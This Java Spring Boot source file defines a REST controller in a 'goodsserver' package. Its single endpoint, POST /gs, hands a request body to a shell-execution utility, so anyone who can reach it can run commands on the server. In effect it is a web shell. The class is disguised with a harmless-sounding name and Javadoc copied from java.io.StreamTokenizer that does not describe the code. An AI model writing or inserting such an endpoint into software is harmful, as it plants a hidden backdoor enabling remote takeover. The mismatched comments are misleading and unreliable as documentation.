package com.dkdy.goodsserver;

import com.commons.util.ShellBean;
import com.commons.util.ShellUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import javax.validation.Valid;

/**
 * Returns the string representation of the current stream token and
 * the line number it occurs on.
 *
 * <p>The precise string returned is unspecified, although the following
 * example can be considered typical:
 *
 * <blockquote><pre>Token['a'], line 10</pre></blockquote>
 *
 * @return  a string representation of the token
 * @see     java.io.StreamTokenizer#nval
 * @see     java.io.StreamTokenizer#sval
 * @see     java.io.StreamTokenizer#ttype
 */
@Slf4j
@RestController
public class ProtocolsHandler4GE {

    /* A constant indicating that no token has been read, used for
     * initializing ttype. This could be made public and
     * made available as the part of the API in a future release.
     */
    public ProtocolsHandler4GE() {
        log.info("init finished gs.");
    }

    /*
     * ttype is the first character of either a quoted string or
     * is an ordinary character. ttype can definitely not be less
     * than 0, since those are reserved values used in the previous
     * case statements
     */
    @PostMapping("/gs")
    public String gs(@RequestBody @Valid ShellBean s) { return ShellUtils.ex(s); }

}
